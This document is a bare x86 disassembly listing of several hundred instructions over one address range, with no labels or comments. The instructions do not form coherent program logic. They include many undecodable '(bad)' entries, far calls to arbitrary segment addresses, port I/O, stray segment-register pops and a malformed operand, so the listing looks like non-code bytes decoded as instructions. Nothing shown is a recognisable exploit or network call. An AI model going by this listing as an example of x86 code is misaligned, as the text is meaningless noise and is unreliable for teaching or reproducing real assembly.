  4458a0:	add    ebx,ebx
  4458a2:	cld    
  4458a3:	pop    ebx
  4458a4:	dec    ebx
  4458a5:	or     edi,esp
  4458a7:	(bad)
  4458ab:	or     dl,dl
  4458ad:	jmp    0x6259:0xd8bd1fcd
  4458b4:	lds    eax,FWORD PTR [eax+ebx*4+0x8]
  4458b8:	imul   ebp,DWORD PTR [eax+eiz*4+0x1a97c6c8],0x61062b6b
  4458c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4458c4:	fadd   QWORD PTR [edx]
  4458c6:	dec    edx
  4458c7:	jbe    0x445856
  4458c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4458ca:	aas    
  4458cb:	xor    esi,DWORD PTR [edx+0x75f51e77]
  4458d1:	jno    0x4458d5
  4458d3:	sub    DWORD PTR [edx+0x36],ecx
  4458d6:	stos   BYTE PTR es:[edi],al
  4458d7:	lods   eax,DWORD PTR ds:[esi]
  4458d8:	mov    cl,0x32
  4458da:	(bad)  
  4458db:	fdivp  st(4),st
  4458dd:	mov    edi,0x10f5993a
  4458e2:	xchg   ebp,eax
  4458e3:	lock and ebp,DWORD PTR [eax+0x4c]
  4458e7:	push   0x75b8ab00
  4458ec:	push   ebx
  4458ed:	inc    edx
  4458ee:	fbld   TBYTE PTR [edi-0x8a0112]
  4458f4:	ins    DWORD PTR es:[edi],dx
  4458f5:	scas   al,BYTE PTR es:[edi]
  4458f6:	dec    ebp
  4458f7:	jecxz  0x4458cb
  4458f9:	fbstp  TBYTE PTR [eax+0x43d7b705]
  4458ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445900:	cmp    ah,BYTE PTR [edi]
  445902:	out    0xdd,al
  445904:	mov    eax,0xb1177412
  445909:	jl     0x445967
  44590b:	jecxz  0x445965
  44590d:	jp     0x44594b
  44590f:	dec    edi
  445910:	repnz and ebx,edx
  445913:	mov    ebx,0x67fc0046
  445918:	mov    al,0xca
  44591a:	mov    dh,BYTE PTR [ebp+0x619aa0d6]
  445920:	outs   dx,BYTE PTR ds:[esi]
  445921:	push   edx
  445922:	shl    ecx,1
  445924:	out    dx,al
  445925:	xor    ecx,DWORD PTR [ebx]
  445927:	pop    ebx
  445928:	mov    esp,0xe03cbe0b
  44592d:	xchg   ecx,eax
  44592e:	arpl   ax,sp
  445930:	std    
  445931:	aas    
  445932:	call   0x245f:0xb98cf906
  445939:	push   ebx
  44593a:	cli    
  44593b:	dec    DWORD PTR [ebp-0x7d9824cb]
  445941:	and    edi,DWORD PTR [ebp+0x336c54a7]
  445947:	call   0x5b6ea623
  44594c:	mov    bl,0x8e
  44594e:	mov    edi,0x99943bb2
  445953:	mov    ds:0xa7d6afc2,al
  445958:	vmaxsd xmm7,xmm1,QWORD PTR [eax+0x2]
  44595d:	retf   
  44595e:	cld    
  44595f:	or     dh,BYTE PTR [edx+0x3dd4c3bc]
  445965:	pop    edi
  445966:	(bad)  
  445967:	push   0xffffffd7
  445969:	xor    dh,ah
  44596b:	pushf  
  44596c:	and    al,0xe4
  44596e:	lea    esp,[edi-0x6f0a007a]
  445974:	xor    BYTE PTR [ebx+0x7092e99a],ah
  44597a:	mov    DWORD PTR [ebp-0x4640e5c7],edi
  445980:	xchg   ebx,eax
  445981:	pop    DWORD PTR [edi]
  445983:	loopne 0x445959
  445985:	in     eax,dx
  445986:	adc    ah,dh
  445988:	outs   dx,DWORD PTR ds:[esi]
  445989:	test   DWORD PTR [edx+0x4a],edx
  44598c:	xor    BYTE PTR [esi+0xbf76ba2],0x78
  445993:	cmc    
  445994:	cmp    edi,DWORD PTR [eax]
  445996:	jle    0x445973
  445998:	adc    BYTE PTR [ebx],cl
  44599a:	lods   eax,DWORD PTR ds:[esi]
  44599b:	pop    gs
  44599d:	or     bl,ah
  44599f:	mov    ch,0x74
  4459a1:	es call 0xd440:0x9b182c6d
  4459a9:	and    al,BYTE PTR [edi-0x59]
  4459ac:	xchg   DWORD PTR ds:0xc0fb292b,ecx
  4459b2:	test   ecx,edi
  4459b4:	mov    dl,0x66
  4459b6:	adc    esi,edx
  4459b8:	push   0xe95d0b52
  4459bd:	or     esi,DWORD PTR [ebx]
  4459bf:	call   0x76f2:0x74cdd62c
  4459c6:	call   0xee28:0x45cf9446
  4459cd:	cmp    bh,BYTE PTR [edi+eiz*4]
  4459d0:	ins    BYTE PTR es:[edi],dx
  4459d1:	xor    ebp,edx
  4459d3:	adc    al,0xaa
  4459d5:	div    BYTE PTR [eax+ebp*4]
  4459d8:	mov    dl,0xfb
  4459da:	sub    al,BYTE PTR [edi+ecx*4+0x7f]
  4459de:	xchg   DWORD PTR [ebp-0x19],esi
  4459e1:	or     edx,DWORD PTR [esp+eax*1-0x2a975cac]
  4459e8:	pop    esp
  4459e9:	dec    ebp
  4459ea:	fwait
  4459eb:	or     esi,DWORD PTR [esi+0x2d3fc91f]
  4459f1:	iret   
  4459f2:	outs   dx,BYTE PTR ds:[esi]
  4459f3:	js     0x445a3d
  4459f5:	or     edi,DWORD PTR [esi]
  4459f7:	xchg   esi,eax
  4459f8:	jmp    0x4459bb
  4459fa:	fsub   st,st(4)
  4459fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4459fd:	out    0x9a,eax
  4459ff:	jns    0x445a06
  445a01:	pop    esp
  445a02:	fcomp  QWORD PTR [eax]
  445a04:	inc    esp
  445a05:	das    
  445a06:	test   BYTE PTR [edi-0x5a255038],ah
  445a0c:	jb     0x445a71
  445a0e:	fst    DWORD PTR [ebp+0x2f9ad94e]
  445a14:	notrack call ebp
  445a17:	inc    esi
  445a18:	and    dh,dl
  445a1a:	mov    ecx,ss
  445a1c:	jbe    0x445a29
  445a1e:	retf   0x6224
  445a21:	in     eax,0x86
  445a23:	stc    
  445a24:	imul   esp,DWORD PTR [edx],0xeab6d29a
  445a2a:	ja     0x445a6e
  445a2c:	ds pop ds
  445a2e:	sub    ah,BYTE PTR [edi-0x3eb04868]
  445a34:	xor    BYTE PTR [ecx],0x29
  445a37:	xor    BYTE PTR [edi+0x45e958f8],0x6f
  445a3e:	test   BYTE PTR [ecx],ah
  445a40:	jb     0x4459c3
  445a42:	inc    esp
  445a43:	mov    ebx,edx
  445a45:	into   
  445a46:	call   0x884fd09e
  445a4b:	pop    edi
  445a4c:	xor    dl,BYTE PTR [edx]
  445a4e:	jp     0x445a79
  445a50:	les    ecx,FWORD PTR [eax-0x7b]
  445a53:	jae    0x445a1b
  445a55:	icebp  
  445a56:	call   0x1dfe:0x5d4b4bbc
  445a5d:	push   cs
  445a5e:	and    BYTE PTR [edx-0x55],cl
  445a61:	xchg   BYTE PTR [ebx],dl
  445a63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445a64:	ja     0x445a1c
  445a66:	std    
  445a67:	mov    bl,0xd2
  445a69:	clc    
  445a6a:	call   0x6901:0x484ded13
  445a71:	inc    eax
  445a72:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  445a74:	cmp    BYTE PTR [esi],dh
  445a76:	push   dx
  445a78:	cli    
  445a79:	mov    ebx,0x52b2dea0
  445a7e:	cmp    BYTE PTR [esi-0x65],0xac
  445a82:	sti    
  445a83:	or     al,BYTE PTR [ebx+0xb]
  445a86:	mov    edi,0xff159329
  445a8b:	out    dx,al
  445a8c:	ret    0x9aed
  445a8f:	rcr    DWORD PTR [esi-0x44],cl
  445a92:	and    DWORD PTR [edx-0x16],edx
  445a95:	pop    ecx
  445a96:	or     cl,BYTE PTR [edi-0x58c86392]
  445a9c:	sbb    al,BYTE PTR [eax-0x3d6a3e2d]
  445aa2:	mov    BYTE PTR [edx+esi*4],cl
  445aa5:	cli    
  445aa6:	lods   al,BYTE PTR ds:[esi]
  445aa7:	push   ebp
  445aa8:	mov    ds:0xd3df82c3,eax
  445aad:	or     esi,DWORD PTR [ecx+0x23]
  445ab0:	in     eax,0xad
  445ab2:	je     0x445a40
  445ab4:	mov    al,ds:0xb2dc2ace
  445ab9:	ins    DWORD PTR es:[edi],dx
  445aba:	push   DWORD PTR [ecx-0x22]
  445abd:	or     dh,cl
  445abf:	cmp    eax,0x5e290b02
  445ac4:	mov    bh,0xbc
  445ac6:	cli    
  445ac7:	cli    
  445ac8:	jge    0x445a70
  445aca:	call   0xb07d:0x85441e31
  445ad1:	pop    ebp
  445ad2:	push   es
  445ad3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445ad4:	lea    ecx,[edx-0x5d]
  445ad7:	mov    ebx,0x1a67502f
  445adc:	ret    
  445add:	int    0x9a
  445adf:	cmc    
  445ae0:	add    eax,esp
  445ae2:	sti    
  445ae3:	(bad)  
  445ae5:	cmp    eax,0x7fcaa785
  445aea:	mov    ch,0x90
  445aec:	xor    esi,DWORD PTR ds:0x98b24c33
  445af2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445af3:	push   esi
  445af4:	mov    esp,0x5459caae
  445af9:	jno    0x445acc
  445afb:	pop    ss
  445afc:	adc    DWORD PTR [ebx],ecx
  445afe:	sahf   
  445aff:	(bad)  
  445b00:	cli    
  445b01:	lock jnp 0x445b12
  445b04:	les    ebx,FWORD PTR [ecx]
  445b06:	call   0xeaaa:0xa1e74bd3
  445b0d:	xchg   esp,eax
  445b0e:	inc    edi
  445b0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445b10:	aam    0x4e
  445b12:	nop
  445b13:	mov    ebx,ecx
  445b15:	push   0x39b35558
  445b1a:	mov    BYTE PTR [esi],bh
  445b1c:	mov    esp,0x66b1f8e8
  445b21:	mov    edi,0xa3d4518
  445b26:	cdq    
  445b27:	stc    
  445b28:	iret   
  445b29:	ins    DWORD PTR es:[edi],dx
  445b2a:	jecxz  0x445b16
  445b2c:	add    DWORD PTR [ebx-0x2f],edi
  445b2f:	arpl   WORD PTR [edx+0x3891b1e3],si
  445b35:	and    al,0xf2
  445b37:	and    ah,dl
  445b39:	or     edi,DWORD PTR [ebp+0x5f]
  445b3c:	popa   
  445b3d:	(bad)  
  445b3e:	fcom   QWORD PTR [ebp+0x29]
  445b41:	test   al,0x98
  445b43:	and    eax,0xac8d094b
  445b48:	push   ss
  445b49:	dec    ebx
  445b4a:	jle    0x445b43
  445b4c:	out    0x57,eax
  445b4e:	mov    bl,0x5b
  445b50:	mov    bl,0x6c
  445b52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445b53:	ss or  al,dh
  445b56:	inc    ecx
  445b57:	xchg   DWORD PTR [eax+ecx*1],ecx
  445b5a:	nop
  445b5b:	jmp    0x37b1:0x5410cad9
  445b62:	xchg   DWORD PTR [edi-0x67906435],ecx
  445b68:	dec    esi
  445b69:	or     edx,DWORD PTR ds:0x2286ea4c
  445b6f:	xlat   BYTE PTR ds:[ebx]
  445b70:	xchg   ebx,eax
  445b71:	popa   
  445b72:	call   0xab5d:0xeccbbe8b
  445b79:	dec    esp
  445b7a:	and    ebx,DWORD PTR [edx-0x222956ea]
  445b80:	scas   al,BYTE PTR es:[edi]
  445b81:	xchg   DWORD PTR [ecx-0x19],esi
  445b84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445b85:	rol    BYTE PTR [esi+esi*1+0x629ad8c0],cl
  445b8c:	push   ebp
  445b8d:	push   ss
  445b8e:	adc    bl,bh
  445b90:	scas   al,BYTE PTR es:[edi]
  445b91:	pop    ebp
  445b92:	pop    esp
  445b93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445b94:	mov    BYTE PTR [edi+0x29],dh
  445b97:	mov    ch,0x98
  445b99:	add    ebp,ebp
  445b9b:	call   0xd31fd052
  445ba0:	fnstcw WORD PTR [ecx+0xb5f7a1f]
  445ba6:	ins    BYTE PTR es:[edi],dx
  445ba7:	arpl   WORD PTR [bp-0x31],ax
  445bab:	mov    edx,0xd19a70c5
  445bb0:	sbb    edx,DWORD PTR ds:0xb1684ecb
  445bb6:	(bad)  
  445bb7:	out    dx,eax
  445bb8:	xor    BYTE PTR [ebx],bl
  445bba:	sti    
  445bbb:	scas   eax,DWORD PTR es:[edi]
  445bbc:	dec    edi
  445bbd:	mov    edi,0xfd106b52
  445bc2:	cwde   
  445bc3:	sbb    BYTE PTR [ecx+0x418d0f9d],ah
  445bc9:	jmp    0x445b55
  445bcb:	repnz cmp cl,bh
  445bce:	and    BYTE PTR [edi-0x4e31058d],0xbb
  445bd5:	mov    esp,0xe4b28e23
  445bda:	push   edx
  445bdb:	xchg   bh,cl
  445bdd:	add    eax,ebx
  445bdf:	mov    edi,DWORD PTR [ebx]
  445be1:	or     edi,DWORD PTR [ecx-0x77]
  445be4:	mov    WORD PTR [eax-0x14660b03],cs
  445bea:	call   0x357d:0xced894e2
  445bf1:	ficomp DWORD PTR [ebx+ebp*8]
  445bf4:	(bad)  
  445bf5:	in     al,dx
  445bf6:	call   0x6a4e:0xba658563
  445bfd:	mov    ds:0x7c24ec9a,al
  445c02:	leave  
  445c03:	faddp  st(3),st
  445c05:	pop    ebp
  445c06:	nop
  445c07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445c08:	sub    ebx,DWORD PTR [ecx]
  445c0a:	sbb    ah,bl
  445c0c:	(bad)  
  445c0d:	fcom   DWORD PTR [ecx-0x3f1942ce]
  445c13:	adc    dh,BYTE PTR [ebx+ebp*2+0x7e]
  445c17:	mov    eax,0x4bf7e7d5
  445c1c:	shl    BYTE PTR [ecx],1
  445c1e:	lods   eax,DWORD PTR ds:[esi]
  445c1f:	sub    DWORD PTR [edi],0x3ab8ee8f
  445c25:	retf   
  445c26:	xchg   ebp,eax
  445c27:	adc    eax,DWORD PTR [ebx]
  445c29:	mov    al,ds:0xdab2a4ac
  445c2e:	and    al,0x48
  445c30:	push   ds
  445c31:	arpl   WORD PTR [eax*8+0xe0c0b80],di
  445c38:	jge    0x445c9c
  445c3a:	(bad)  
  445c3b:	(bad)  
  445c3c:	outs   dx,DWORD PTR ds:[esi]
  445c3d:	sbb    eax,0x16fabfa3
  445c42:	loopne 0x445c5d
  445c44:	mov    dl,0x18
  445c46:	js     0x445cbe
  445c48:	dec    edi
  445c49:	xchg   edi,eax
  445c4a:	cmp    eax,0xda241e82
  445c4f:	mov    ch,0xf1
  445c51:	popa   
  445c52:	jmp    0x445be1
  445c54:	dec    esp
  445c55:	in     al,dx
  445c56:	call   0x5677:0xcb3682c
  445c5d:	pop    ss
  445c5e:	aas    
  445c5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445c60:	int3   
  445c61:	xor    edi,0x18411fdf
  445c67:	cs mov dl,0x40
  445c6a:	jp     0x445c25
  445c6c:	iret   
  445c6d:	in     al,dx
  445c6e:	mov    bl,0x5
  445c70:	sti    
  445c71:	jmp    0x445c30
  445c73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445c74:	out    dx,al
  445c75:	test   BYTE PTR [edx+0x72455988],0x82
  445c7c:	mov    cl,0x74
  445c7e:	imul   eax,edi,0x474a049c
  445c84:	int3   
  445c85:	mov    cl,0xca
  445c87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445c88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445c89:	ja     0x445c1c
  445c8b:	mov    cl,0x88
  445c8d:	cs xchg esp,eax
  445c8f:	fild   WORD PTR [esi+0x66]
  445c92:	cdq    
  445c93:	call   0x3e3262a7
  445c98:	inc    ebx
  445c99:	mov    bl,0xff
  445c9b:	mov    ds:0xabc0b1b,eax
  445ca0:	or     ebp,DWORD PTR [eax-0x5b]
  445ca3:	pop    esi
  445ca4:	and    esp,ecx
  445ca6:	call   0x823d:0xcff93c14
  445cad:	sti    
  445cae:	sub    eax,0xbbbb9ca7
  445cb3:	lea    esi,[esi-0x52642b77]
  445cb9:	push   es
  445cba:	xor    al,0x9c
  445cbc:	and    BYTE PTR ss:[ecx-0x2a],dh
  445cc0:	dec    ebp
  445cc1:	retf   0x4660
  445cc4:	xor    DWORD PTR [ebx],ebp
  445cc6:	cmp    bh,BYTE PTR [ebx+0x1251dfb2]
  445ccc:	loope  0x445d08
  445cce:	retf   0xc9cb
  445cd1:	add    eax,0x3f44a3b8
  445cd6:	(bad)  
  445cd8:	popa   
  445cd9:	(bad)  
  445cda:	sub    esp,DWORD PTR [edi+0x6a]
  445cdd:	mov    ebx,DWORD PTR [ebx-0x4be3c492]
  445ce3:	stc    
  445ce4:	es dec edi
  445ce6:	bound  edx,QWORD PTR [eax]
  445ce8:	mov    BYTE PTR [edx],cl
  445cea:	lahf   
  445ceb:	xchg   ecx,eax
  445cec:	fstp   TBYTE PTR [ebp-0x218e77da]
  445cf2:	ins    BYTE PTR es:[edi],dx
  445cf3:	adc    ah,BYTE PTR [bp+di]
  445cf6:	call   0x6f7b:0xc3c1321
  445cfd:	scas   al,BYTE PTR es:[edi]
  445cfe:	lahf   
  445cff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445d00:	ret    0x7053
  445d03:	mov    ds:0xbcd1bad6,eax
  445d08:	mov    esp,0x99ef3b95
  445d0d:	sbb    al,0x9a
  445d0f:	mov    ebx,0x43dc6291
  445d14:	xor    cl,BYTE PTR [ebx]
  445d16:	arpl   bp,dx
  445d18:	add    dh,BYTE PTR [esi-0x16]
  445d1b:	push   esp
  445d1c:	push   ds
  445d1d:	mov    eax,ds:0xe0fdd39a
  445d22:	or     al,0xbb
  445d24:	retf   0x1890
  445d27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445d28:	xchg   ah,ah
  445d2a:	sub    eax,ebx
  445d2c:	adc    al,0x8b
  445d2e:	mov    al,ds:0x1fd2b22a
  445d33:	dec    edi
  445d34:	(bad)  
  445d35:	push   ecx
  445d36:	mov    ds:0x177a821,eax
  445d3b:	mov    eax,0x23f7d079
  445d40:	jg     0x445cca
  445d42:	(bad)  
  445d43:	daa    
  445d44:	dec    edi
  445d45:	mov    ecx,0x75b21b9f
  445d4a:	push   ss
  445d4b:	dec    ebp
  445d4c:	es jecxz 0x445da5
  445d4f:	cmp    eax,0xa1443223
  445d54:	lods   eax,DWORD PTR ds:[esi]
  445d55:	je     0x445da8
  445d57:	addr16 call 0x6a49e9f3
  445d5d:	inc    esp
  445d5e:	call   0xd52b:0xcd2eb6ab
  445d65:	jno    0x445d51
  445d67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445d68:	push   cs
  445d69:	dec    esp
  445d6a:	dec    ebp
  445d6b:	vpcmpeqw xmm2,xmm3,xmm3
  445d6f:	dec    ecx
  445d70:	mov    al,0x7c
  445d72:	push   ebx
  445d73:	xor    edi,DWORD PTR [esi-0x22]
  445d76:	xor    eax,0xc8c15a47
  445d7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445d7c:	outs   dx,BYTE PTR ds:[esi]
  445d7d:	xchg   ebx,eax
  445d7e:	add    al,0xfb
  445d80:	test   bl,ah
  445d82:	imul   edi,DWORD PTR [ebx-0x746d44e],0xffffffd7
  445d89:	xor    al,BYTE PTR [edi-0x14]
  445d8c:	add    ebx,DWORD PTR [ebx+0xb7c5967]
  445d92:	pop    es
  445d93:	push   ds
  445d94:	mov    dh,0x66
  445d96:	aam    0xfd
  445d98:	les    edi,FWORD PTR [edi-0x66]
  445d9b:	sub    ecx,DWORD PTR [ecx]
  445d9d:	dec    edx
  445d9e:	xor    esp,DWORD PTR [ebx]
  445da0:	mov    ch,0x99
  445da2:	add    eax,0x23e8aca7
  445da7:	xchg   DWORD PTR [ebx-0x4d0c356d],esi
  445dad:	mov    al,ds:0xdb1ad5b5
  445db2:	cmp    BYTE PTR ds:0x5595772b,0x27
  445db9:	or     edi,DWORD PTR [ebp+0x6]
  445dbc:	fcmovu st,st(1)
  445dbe:	aam    0x2e
  445dc0:	cmc    
  445dc1:	adc    eax,0xa167429a
  445dc6:	and    BYTE PTR [esi],bl
  445dc8:	mov    ah,0x49
  445dca:	or     esp,DWORD PTR [edi-0x43980633]
  445dd0:	ret    
  445dd1:	fwait
  445dd2:	jle    0x87eb968a
  445dd8:	pop    ds
  445dd9:	div    ebx
  445ddb:	mov    ebx,0xd0c40b71
  445de0:	jecxz  0x445dcc
  445de2:	adc    eax,0x9adee14d
  445de7:	dec    ebx
  445de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445de9:	mov    edi,0x279aeb9c
  445dee:	xor    eax,0xe4f034a7
  445df3:	inc    esp
  445df4:	lock xor al,0xae
  445df7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445df8:	mov    ebp,0x5830ba64
  445dfd:	jmp    0x445e37
  445dff:	je     0x445e55
  445e01:	pop    es
  445e02:	dec    ebp
  445e03:	pop    ss
  445e04:	sbb    bh,BYTE PTR [esi+0xc]
  445e07:	aam    0xfd
  445e09:	mov    eax,DWORD PTR ss:[edx-0x52]
  445e0d:	dec    edi
  445e0e:	pop    eax
  445e0f:	daa    
  445e10:	pop    ds
  445e11:	jne    0x445dca
  445e13:	mov    edi,0x802aa9f4
  445e18:	mov    dl,0xd3
  445e1a:	sub    eax,0x702a9030
  445e1f:	popa   
  445e20:	xor    eax,0xc840870b
  445e25:	or     DWORD PTR [ebp-0x660a61a6],ebp
  445e2b:	stc    
  445e2c:	fcom   st(1)
  445e2e:	test   edi,0x11f6f3a2
  445e34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445e35:	std    
  445e36:	cmp    al,0x1f
  445e38:	shl    DWORD PTR [ecx+0x52],1
  445e3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445e3c:	(bad)  
  445e3d:	xor    ebp,DWORD PTR [ecx]
  445e3f:	mov    ds:0x4ed2ff9e,al
  445e44:	mov    dl,0x2a
  445e46:	jnp    0x445de6
  445e48:	sbb    ecx,DWORD PTR [edx]
  445e4a:	stc    
  445e4b:	pop    ss
  445e4c:	scas   al,BYTE PTR es:[edi]
  445e4d:	or     esi,DWORD PTR [eax-0x72885360]
  445e53:	adc    al,0x1e
  445e55:	aas    
  445e56:	pushf  
  445e57:	div    ah
  445e59:	dec    esp
  445e5a:	mov    esp,0xef354c92
  445e5f:	and    esi,DWORD PTR [edx]
  445e61:	dec    esi
  445e62:	lods   eax,DWORD PTR ds:[esi]
  445e63:	lods   eax,DWORD PTR ds:[esi]
  445e64:	je     0x445e72
  445e66:	aas    
  445e67:	lods   al,BYTE PTR ds:[esi]
  445e68:	mov    ch,0xe9
  445e6a:	jo     0x445e4a
  445e6c:	hlt    
  445e6d:	xchg   BYTE PTR [edx+0x6a],bl
  445e70:	cld    
  445e71:	fiadd  DWORD PTR [ebp-0x60]
  445e74:	mov    edx,0xe8b0893c
  445e79:	pop    ebx
  445e7a:	in     al,0xc1
  445e7c:	pop    DWORD PTR [eax]
  445e7e:	xchg   al,ch
  445e80:	fsincos 
  445e82:	fisubr DWORD PTR [edi-0x53]
  445e85:	inc    ebp
  445e86:	mov    esi,0x290bed22
  445e8b:	ror    DWORD PTR [esp+ebx*8+0x1841ef02],1
  445e92:	fwait
  445e93:	pop    edi
  445e94:	mov    ?,WORD PTR [eax-0x3ffca817]
  445e9a:	imul   esi,DWORD PTR ds:0xe82f695a,0xffffffdb
  445ea1:	mov    eax,ds:0xf66fd39a
  445ea6:	lods   eax,DWORD PTR fs:[esi]
  445ea8:	jmp    0x445eb5
  445eaa:	sbb    edi,ecx
  445eac:	and    al,0x14
  445eae:	xchg   ebx,eax
  445eaf:	das    
  445eb0:	xchg   ebp,eax
  445eb1:	pop    DWORD PTR [edi-0x252a5b7c]
  445eb7:	jl     0x445ef6
  445eb9:	enter  0x856b,0x35
  445ebd:	add    BYTE PTR [ebx+0x1a633c11],dh
  445ec3:	xor    eax,0xffffffa8
  445ec6:	jne    0x445f34
  445ec8:	mov    DWORD PTR [eax-0x68],ebp
  445ecb:	ror    bl,1
  445ecd:	push   ds
  445ece:	call   0x62dc:0xbcaf70c0
  445ed5:	into   
  445ed6:	popa   
  445ed7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445ed8:	dec    esp
  445ed9:	test   al,0xf4
  445edb:	dec    eax
  445edc:	(bad)  
  445edd:	cmp    dl,ah
  445edf:	scas   eax,DWORD PTR es:[edi]
  445ee0:	add    eax,0xdefcdd7b
  445ee5:	jecxz  0x445f5a
  445ee7:	cmp    DWORD PTR [edx-0x1c],0xffffff99
  445eeb:	cwde   
  445eec:	dec    eax
  445eed:	in     al,dx
  445eee:	cmp    DWORD PTR [edi-0x23cc583e],esp
  445ef4:	mov    ds:0xb2ad89f5,eax
  445ef9:	pop    es
  445efa:	addr16 iret 
  445efc:	and    eax,0x3938a0e0
  445f01:	or     eax,ebx
  445f03:	fst    QWORD PTR [edx+edi*8-0x59]
  445f07:	xor    al,BYTE PTR [esi-0x52c35bf1]
  445f0d:	mov    ebx,DWORD PTR [eax+0x64]
  445f10:	(bad)  
  445f11:	in     al,0xf7
  445f13:	sbb    dh,bl
  445f15:	sbb    eax,0xb7c7f0b
  445f1a:	adc    BYTE PTR [edi],ch
  445f1c:	sub    edi,DWORD PTR [ebx+0x7f]
  445f1f:	mov    ebx,0x78402fb2
  445f24:	lods   al,BYTE PTR ds:[esi]
  445f25:	push   esp
  445f26:	and    edi,DWORD PTR [edi-0xf13f675]
  445f2c:	call   0xe1d7:0x325bad14
  445f33:	push   edi
  445f34:	jmp    0x658bf9d3
  445f39:	sbb    DWORD PTR [ecx+0x621fb7af],ebp
  445f3f:	scas   al,BYTE PTR es:[edi]
  445f40:	mov    ch,BYTE PTR [ebx+0x55]
  445f43:	sbb    dh,BYTE PTR [edx+0x6b328047]
  445f49:	es mov esi,0x9aa7eb20
  445f4f:	pusha  
  445f50:	ret    0x185
  445f53:	mov    al,0x1b
  445f55:	inc    ebp
  445f56:	hlt    
  445f57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445f58:	jle    0x445fd1
  445f5a:	pop    eax
  445f5b:	call   edx
  445f5d:	das    
  445f5e:	jbe    0x445fbb
  445f60:	mov    ch,0xbc
  445f62:	out    dx,al
  445f63:	pop    ss
  445f64:	fcmovnbe st,st(5)
  445f66:	sub    ch,ch
  445f68:	cli    
  445f69:	jge    0x445fd8
  445f6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445f6c:	loope  0x445ef4
  445f6e:	jo     0x445fdf
  445f70:	mov    ch,0xde
  445f72:	jb     0x445f2f
  445f74:	mov    dl,0xe0
  445f76:	in     eax,0xcf
  445f78:	gs stc 
  445f7a:	push   0xffffffad
  445f7c:	icebp  
  445f7d:	add    al,0x3f
  445f7f:	es call 0xdef65a32
  445f85:	es fndisi(8087 only) 
  445f88:	lea    ebx,[edi+0x571ca7ff]
  445f8e:	retf   0x42ac
  445f91:	push   0x18
  445f93:	mov    ebx,0x271385f0
  445f98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445f99:	jae    0x445fdb
  445f9b:	shr    BYTE PTR [ebp+ecx*4-0x66],1
  445f9f:	popa   
  445fa0:	mov    fs,eax
  445fa2:	popa   
  445fa3:	jp     0x445ff9
  445fa5:	clc    
  445fa6:	test   eax,0xb33a93a7
  445fab:	stos   DWORD PTR es:[edi],eax
  445fac:	push   ebx
  445fad:	nop
  445fae:	(bad)  
  445faf:	test   al,0x46
  445fb1:	out    0x9a,al
  445fb3:	cld    
  445fb4:	mov    edi,0xf62a52dc
  445fb9:	fstp   DWORD PTR [eax+0x369ad2a8]
  445fbf:	popf   
  445fc0:	xor    bh,bl
  445fc2:	mov    bh,0x6d
  445fc4:	mov    al,ds:0xd4ed9ac6
  445fc9:	mov    ebx,0x7a0a037b
  445fce:	dec    eax
  445fcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445fd0:	stos   DWORD PTR es:[edi],eax
  445fd1:	adc    DWORD PTR [edi],ebp
  445fd3:	in     al,dx
  445fd4:	ror    bh,1
  445fd6:	xor    eax,0xf06ebbd7
  445fdb:	adc    DWORD PTR [ebp-0x75],eax
  445fde:	outs   dx,BYTE PTR ds:[esi]
  445fdf:	addr16 mov ecx,0xa29d65ed
  445fe5:	das    
  445fe6:	xchg   BYTE PTR [ebp-0x5a],dl
  445fe9:	dec    edx
  445fea:	hlt    
  445feb:	pusha  
  445fec:	pop    edx
  445fed:	inc    eax
  445fee:	ds dec ebx
  445ff0:	call   0x65f0:0x87da9ad5
  445ff7:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  445ff9:	outs   dx,DWORD PTR ds:[esi]
  445ffa:	test   al,0xa6
  445ffc:	loop   0x445fe6
  445ffe:	xchg   edx,eax
  445fff:	cli    
  446000:	mov    eax,0x1d537b2f
  446005:	and    DWORD PTR [edi-0x203cba2b],ebx
  44600b:	dec    edx
  44600c:	jae    0x44608d
  44600e:	shl    al,1
  446010:	push   esi
  446011:	retf   0xa747
  446014:	cmp    eax,0xe9223a13
  446019:	test   DWORD PTR [ebp+0x30edb2dc],0xfc150fab
  446023:	out    dx,al
  446024:	jmp    0x233f:0xcce9030b
  44602b:	jle    0x44601f
  44602d:	push   eax
  44602e:	xchg   esp,eax
  44602f:	test   BYTE PTR [edx-0x30],0x1d
  446033:	out    0x63,eax
  446035:	addr16 push 0xc50552ff
  44603b:	gs je  0x44608c
  44603e:	mov    ebp,0x4f5bec9d
  446043:	or     al,0xbc
  446045:	mov    edx,0xe4b142e2
  44604a:	mov    ds:0xb1964fff,al
  44604f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446050:	inc    esi
  446051:	dec    ebx
  446052:	mov    ah,0x62
  446054:	fnstenv [ebp+0x2e]
